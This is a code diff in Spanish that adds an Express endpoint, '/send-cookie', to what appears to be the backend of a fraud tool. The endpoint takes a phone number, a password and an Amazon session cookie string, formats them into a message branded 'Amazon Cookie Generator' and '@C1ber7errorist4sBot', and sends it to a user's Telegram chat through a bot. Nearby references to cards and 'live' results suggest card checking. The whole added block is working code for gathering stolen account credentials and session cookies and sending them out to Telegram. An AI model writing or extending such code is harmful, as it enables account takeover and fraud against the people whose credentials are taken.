@@ -231,4 +231,87 @@ function formatearMensajeTelegram(card, result) {
     return mensaje;
 }
 
+// ============================================
+// ENDPOINT 3: Enviar cookie a Telegram
+// ============================================
+router.post('/send-cookie', async (req, res) => {
+    try {
+        const { username, phone, password, cookieString, country } = req.body;
+        
+        if (!username || !phone || !password || !cookieString) {
+            return res.status(400).json({
+                success: false,
+                error: 'Faltan datos: username, phone, password, cookieString son requeridos'
+            });
+        }
+        
+        console.log(`📤 Enviando cookie a Telegram para @${username}`);
+        
+        // Buscar el chat_id del usuario en la base de datos
+        const userResult = await pool.query(
+            'SELECT id, telegram_chat_id FROM users WHERE username = $1',
+            [username]
+        );
+        
+        if (userResult.rows.length === 0) {
+            return res.status(404).json({
+                success: false,
+                error: 'Usuario no encontrado'
+            });
+        }
+        
+        const user = userResult.rows[0];
+        
+        if (!user.telegram_chat_id) {
+            return res.status(400).json({
+                success: false,
+                error: 'El usuario no ha vinculado su Telegram. Debe escribir /start al bot primero.'
+            });
+        }
+        
+        // Formatear mensaje bonito para Telegram
+        const mensaje = formatearMensajeCookie(phone, password, cookieString, country);
+        
+        // Usar la función del bot para enviar el mensaje
+        const { sendLiveToTelegram } = require('../bot_telegram');
+        const envioResult = await sendLiveToTelegram(user.telegram_chat_id, mensaje);
+        
+        if (envioResult.success) {
+            res.json({
+                success: true,
+                message: 'Cookie enviada a Telegram correctamente'
+            });
+        } else {
+            res.status(500).json({
+                success: false,
+                error: envioResult.error || 'Error al enviar a Telegram'
+            });
+        }
+        
+    } catch (error) {
+        console.error('❌ Error en /send-cookie:', error);
+        res.status(500).json({
+            success: false,
+            error: error.message
+        });
+    }
+});
+
+// Función auxiliar para formatear mensaje de cookie
+function formatearMensajeCookie(phone, password, cookieString, country = 'MX') {
+    const flag = country === 'MX' ? '🇲🇽' : '🌍';
+    
+    let mensaje = `🍪 *¡NUEVA COOKIE AMAZON GENERADA!* 🍪\n\n`;
+    mensaje += `📞 *Teléfono:* \`${phone}\`\n`;
+    mensaje += `🔑 *Contraseña:* \`${password}\`\n`;
+    mensaje += `🌎 *País:* ${flag} ${country}\n\n`;
+    mensaje += `🍪 *Cookie String:*\n\`\`\`\n${cookieString}\n\`\`\`\n\n`;
+    mensaje += `⏰ *Generada:* ${new Date().toLocaleString()}\n`;
+    mensaje += `🛒 *Servicio:* Amazon Cookie Generator\n`;
+    mensaje += `\n━━━━━━━━━━━━━━━━━━━\n`;
+    mensaje += `@C1ber7errorist4sBot`;
+    
+    return mensaje;
+}
+
 module.exports = router;
